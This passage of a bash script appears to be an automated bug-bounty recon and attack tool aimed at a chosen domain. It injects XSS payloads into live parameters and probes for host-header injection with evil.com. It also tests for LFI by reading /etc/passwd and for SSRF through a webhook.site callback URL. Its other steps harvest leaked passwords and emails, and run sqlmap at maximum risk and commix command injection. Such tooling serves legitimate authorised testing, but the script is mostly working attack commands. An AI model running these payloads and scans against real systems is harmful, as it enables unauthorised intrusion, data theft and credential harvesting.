 nuclei -duc --list ${dirdomain}/subdomains/vivos.txt -tags exposure,misconfig,config,phpinfo,git,env,firebase,cpanel,cve,cves,cve2000,cve2001,cve2002,cve2003,cve2004,cve2005,cve2006,cve2007,cve2008,cve2009,cve2010,cve2011,cve2012,cve2013,cve2014,cve2015,cve2016,cve2017,cve2018,cve2019,cve2020,cve2021,cve2022,cve2023,cve2024,cve02024,cnvd,xss,sqli,lfi,ssti,xxe,crlf,rce,redirect,swagger --output ${dirdomain}/vulnerability/exposure.txt
   cat ${dirdomain}/parameters/endpoints.txt | qsreplace 'kalirfl' | httpx --silent -ms 'kalirfl' -o ${dirdomain}/parameters/refletidos.txt -t 75
cat ${dirdomain}/parameters/refletidos.txt | qsreplace '"><svg/onload=prompt(document.domain)>' | airixss -p 'prompt(document.domain)' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt
cat ${dirdomain}/parameters/refletidos.txt | qsreplace '"><img src=IDONTNO onError=confirm(1337)>' | airixss -p 'confirm(1337)>' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt
cat ${dirdomain}/parameters/refletidos.txt | qsreplace '"></script><hTMl onmouseovER=prompt(1447)>' | airixss -p 'onmouseovER=prompt(1447)>' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt
cat ${dirdomain}/parameters/refletidos.txt | qsreplace '"><iframe src=x>' | airixss -p 'src=x>' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt

cat ${dirdomain}/vulnerability/airi.txt | awk '{ print $3 }' | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" > ${dirdomain}/vulnerability/vuln-injections.txt 
    
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}Information disclosure${NORMAL}]\r"
    
cat ${dirdomain}/subdomains/livesubdomain.txt | sed -E 's#^(https?://)?([^/]+).*#\2#' |tee -a ${dirdomain}/subdomains/domain-IP.txt &> /dev/null

    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}Information disclosure${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat ${dirdomain}/info/finalInfo.txt 2> /dev/null | wc -l )"


echo -ne "\n${NORMAL}${BOLD}${YELLOW}[*] LeakSearch:${NORMAL}${BOLD} Getting leaked passwords, emails and usernames\r"
porch-pirate -s $target --dump  > ${dirdomain}/info/postman_leaks.txt
python3 /root/Tools/SwaggerSpy/swaggerspy.py $target | grep -i "[*]\|URL" > ${dirdomain}/info/swagger_leaks.txt
emailfinder -d $target  | anew -q ${dirdomain}/info/emailfinder.txt
cat ${dirdomain}/info/emailfinder.txt | grep "@" | grep -iv "|_" | anew -q ${dirdomain}/info/emails.txt
rm -f ${dirdomain}/info/emailfinder.txt
json_file="${dirdomain}/info/leaks.json"
leaks_file="${dirdomain}/info/emails.txt"
curl -s https://api.proxynova.com/comb?query=${target} > ${dirdomain}/info/leaks.json &> /dev/null
jq -r '.lines[]' "$json_file" > "$leaks_file" 
echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] LeakSearch  -  ${NORMAL}[${GREEN}finish${TICK}${NORMAL}]${TTAB} Leaks Found: ${LGREEN}$(cat $leaks_file 2> /dev/null | wc -l )"


    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}Host Header Injection${NORMAL}]\r"
for i in $(cat ${dirdomain}/subdomains/livesubdomain.txt); do
     file=$(curl -s -m5 -I  "{$i}" -H "X-Forwarded-Host: evil.com" &> /dev/null)  
    echo -n -e ${YELLOW}"URL: $i" >> ${dirdomain}/vulnerability/output.txt
    echo "$file" >> ${dirdomain}/vulnerability/output.txt
    if grep -q evil   <<<"$file"
  then
  echo  -e ${RED}"\nURL: $i  [Vulnerable]"${RED}
  cat ${dirdomain}/vulnerability/output.txt | grep -e URL  -e  evil   >> ${dirdomain}/vulnerability/vulnerable_Header.txt
  rm ${dirdomain}/vulnerability/output.txt
  else
  echo -n -e ${GREEN}"\nURL: $i  [Not Vulnerable]\n"
   rm ${dirdomain}/vulnerability/output.txt
 fi

done &> /dev/null

    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}Host Header Injection${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat ${dirdomain}/vulnerability/vulnerable_Header.txt 2> /dev/null | wc -l )"

    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}Information disclosure${NORMAL}]\r"
    
cat ${dirdomain}/subdomains/livesubdomain.txt | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "$httpxpath" -mc 200 -t 60 |tee -a ${dirdomain}/info/Information.txt &> /dev/null
cat ${dirdomain}/subdomains/livesubdomain.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -p 80,443,8080,8443,9000,9001,9002,9003,8088 -threads 500 -title >> ${dirdomain}/info/Information.txt &> /dev/null
cat ${dirdomain}/info/Information.txt | grep -oP 'https?://[^\s]+' > ${dirdomain}/info/finalInfo.txt
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}Information disclosure${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat ${dirdomain}/info/finalInfo.txt 2> /dev/null | wc -l )"











    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}openreditrct${NORMAL}]\r"
cat ${dirdomain}/parameters/redirect.txt | openredirex --keyword FUZZ -p $tools/OpenRedireX/payloads.txt| grep "^http" >  ${dirdomain}/vulnerability/redirect.txt &> /dev/null
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}openreditrct${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat ${dirdomain}/vulnerability/redirect.txt 2> /dev/null | wc -l )"
   echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}Xss${NORMAL}]\r" 
     ##===========================================================
# python3 /root/Desktop/github/xss_vibes/main.py -f $xss_file -o $report_xss | notify -bulk -data $report_xss 2> /dev/null
# filteRED_urls=$(grep "=" "$url_file")
# mapfile -t urls <<< "$filteRED_urls"
# mapfile -t files < "$xss_list"
# > "$report_xss"
# for url in "${urls[@]}"
# do
#   for file in "${files[@]}"
 #  do
        # Replace what comes after "=" with the content of file_list
 #        replaced_url="${url%=*}=${file}"
  #      full_url="${replaced_url}"
   #      response=$(curl -s -o /dev/null -w "%{http_code}" "$full_url")
  #      if [ "$response" == "200" ]; then
 #           echo -ne "${NORMAL}[${BLINK}${CROSS}] ${NORMAL}${RED}$full_url ${YELLOW}Vulnerable to XSS${NORMAL}\n"
 #           echo -ne "Vulnerable to XSS: $full_url\n" >> "$report_xss"
 #        else
 #            echo -ne "${GREEN}[-]$full_url${YELLOW}Not Vulnerable to XSS${NORMAL} \n"
 #        fi
 #    done
# done

   ##===========================================================
   cat ${dirdomain}/parameters/liveendpoints.txt| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
 payload=$(cat "$xss_list")
 cat ${dirdomain}/parameters/endpoints.txt | qsreplace '$payload' | freq | egrep -v 'Not' | anew -q $dirdomain/vulnerability/xss.txt &> /dev/null
     echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}Xss${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $report_xss 2> /dev/null | wc -l )"
#      echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}CORS${NORMAL}]\r"
#filteRED_urls=$(grep "=" "$url_file")
#mapfile -t urls <<< "$filteRED_urls"
#> "$report_cors"
#for url in "${urls[@]}"
#do
#response=$(curl -s -o /dev/null -w "%{http_code}" -H "Origin: https://evil.com" "$url")
#if [ "$response" == "200" ]; then
#echo -ne "${NORMAL}[${BLINK}${CROSS}] ${NORMAL}$url${RED}Vulnerable to CORS Misconfiguration:\n"
#echo -ne "${RED}Vulnerable to CORS Misconfiguration: $url" >> "$report_cors"
#else
#echo -ne "[-]$url${GREEN}Not Vulnerable to CORS Misconfiguration: \n"
#fi
#done  
#    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}CORS${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $report_cors 2> /dev/null | wc -l )"   
     
     
   echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}LFI${NORMAL}]\r"
   ##===========================================================
#   cat $lfi_list | while read -r payload; do
 #   cat ${dirdomain}/parameters/lfi.txt | qsreplace "$payload"
#done | anew -q ${dirdomain}/osint/lfi.txt

#while IFS= read -r line; do
#    if curl -s -L -H "X-Bugbounty: Testing" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" --insecure "$line" | grep "root:"; then
 #       echo -e "[POTENTIAL LFI] - $line"
 #   fi
#done < ${dirdomain}/osint/lfi.txt | grep "POTENTIAL LFI" | anew -q $dirdomain/vulnerability/lfi.txt 
   
 cat ${dirdomain}/parameters/lfi.txt |  httpx -silent -path $lfi_list -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -mc 200 -mr "root:[x*]:0:0:"  | anew -q $dirdomain/vulnerability/lfi.txt&> /dev/null
   
   
   ##===========================================================
    cat $lfi_list | xargs -P 50 -I % bash -c "cat ${dirdomain}/parameters/lfi.txt | qsreplace % " 2> /dev/null | anew -q ${dirdomain}/osint/lfi.txt 
  xargs -a ${dirdomain}/osint/lfi.txt -P 50 -I % bash -c "curl -s -L  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"root:\" && echo -e \"[POTENTIAL LFI] - % \n \"" 2> /dev/null | grep "POTENTIAL LFI" | anew -q $dirdomain/vulnerability/lfi.txt 
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}LFI${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $dirdomain/vulnerability/lfi.txt 2> /dev/null | wc -l )"
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}CRLF${NORMAL}]\r"
   #  crlfuzz -l ${dirdomain}/subdomains/livesubdomain.txt -s | anew $dirdomain/vulnerability/crlf.txt &> /dev/null
   #  crlfsuite -iT "$subdomains_live" -oN ${dirdomain}/vulnerability/crlfsuite.txt &> /dev/null
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}CRLF${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $dirdomain/vulnerability/crlf.txt 2> /dev/null | wc -l )"
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}SSRF${NORMAL}]\r"
    cat ${dirdomain}/parameters/ssrf.txt | qsreplace "https://webhook.site/620c2da1-2ec4-4318-8f20-1f31faadbe4e" 2> /dev/null | anew -q ${dirdomain}/osint/ssrf.txt
    cat ${dirdomain}/osint/ssrf.txt | xargs -P 55 -I % bash -c "curl -s  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"compute.internal\" && echo -e \"[${RED}POTENTIAL SSRF${NORMAL}] - % \n \"" 2> /dev/null | grep "POTENTIAL SSRF" | anew $dirdomain/vulnerability/ssrf.txt | notify -bulk -data ssrf.txt&> /dev/null
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}SSRF${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $dirdomain/vulnerability/ssrf.txt 2> /dev/null | wc -l )"
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}SQLi${NORMAL}]\r"
   cat ${dirdomain}/parameters/liveendpoints.txt | grep ".php" | sed 's/.php.*/.php/' | sort -u | sed 's|$|%27%22%60|' | while read url ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url ${RED}Vulnerable\n" || echo -e "$url ${GREEN}Not Vulnerable\n" ; done 
    
    python3 ~/tools/SQLiDetector/sqlidetector.py -f ${dirdomain}/parameters/sqli.txt -w 50 -o ${dirdomain}/parameters/sqlidetector.txt -t 10 &> /dev/null
   sqlmap -m ${dirdomain}/parameters/sqlidetector.txt --batch --risk 3 --random-agent --level 5 | tee -a $dirdomain/vulnerability/sqli.txt | notify -bulk -data sqli.txt&> /dev/null
   
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}SQLi${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $dirdomain/vulnerability/sqli.txt 2> /dev/null | wc -l )"
      echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}SSTI${NORMAL}]\r"
for url in $(cat ${dirdomain}/parameters/ssti.txt);do
tinja url -u $url
done
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}SSTI${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $dirdomain/vulnerability/ssti.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}Prototype${NORMAL}]\r"
pphack -l ${dirdomain}/subdomains/livesubdomain.txt -o $prototype_file &> /dev/null
    
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}Prototype${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $prototype_file 2> /dev/null | wc -l )"
 
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}command_injection${NORMAL}]\r"
 commix --batch -m ${dirdomain}/parameters/rce.txt --output-dir ${dirdomain}/vulnerability/command_injection.txt | notify -bulk -data command_injection.txt&> /dev/null
    
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}command_injection${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat ${dirdomain}/vulnerability/command_injection.txt 2> /dev/null | wc -l )"
  
}


# Function to generate a full report
generate_report() {
    echo -e "\n${BOLD}${GREEN} 
▒█▀▀█ █▀▀ █▀▀ █░░█ █░░ ▀▀█▀▀
▒█▄▄▀ █▀▀ ▀▀█ █░░█ █░░ ░░█░░
▒█░▒█ ▀▀▀ ▀▀▀ ░▀▀▀ ▀▀▀ ░░▀░░\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomains of ${RED}$target${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomains Found:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/subdomains/subdomains.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomains Alive:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/subdomains/livesubdomain.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Endpoints:${NORMAL}${BOLD}${GREEN} $(cat subdomains/endpoints.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} XSS:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/vulnerability/xss.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} SSTI:${NORMAL}${BOLD}${GREEN} $(cat $dirdomain/vulnerability/ssti.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} SQLi:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/vulnerability/sqli.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Open Redirect:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/vulnerability/openredirect.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} SSRF:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/vulnerability/ssrf.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} CRLF:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/vulnerability/crlf.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} LFI:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/vulnerability/lfi.txt 2> /dev/null | wc -l)${NORMAL}\n"



}

full_recon() {
    scan_subdomains
    get_endpoints
    get_info
    get_ips
    check_vulnerabilities
    generate_report
}
# Main menu
while true; do
    echo -ne "${GREEN}Please choose an option:${NORMAL}\n"
    echo -ne "${GREEN}#################################\n"
    echo -ne "${GREEN}1. Scan for subdomains${NORMAL}\n"
    echo -ne "${GREEN}2. Get all endpoints${NORMAL}\n"
    echo -ne "${GREEN}3. Get Info of subdomains${NORMAL}\n"
    echo -ne "${GREEN}4. Get IPs of subdomains${NORMAL}\n"
    echo -ne "${GREEN}5. Check for vulnerabilities${NORMAL}\n"
    echo -ne "${GREEN}6. Generate a full report${NORMAL}\n"
    echo -ne "${GREEN}7. Full Recon${NORMAL}\n"
    echo -ne "${GREEN}8. Exit${NORMAL}\n"
    echo -ne "${GREEN}#################################\n"
    read -p "Enter your choice (1-7): " choice

    case $choice in
        1) scan_subdomains ;;
        2) get_endpoints ;;
        3) get_info ;;
        4) get_ips ;;
        5) check_vulnerabilities ;;
        6) generate_report ;;
        7) full_recon ;;
        8) exit ;;
        *) echo "Invalid option. Please try again." ;;
    esac

    echo
done
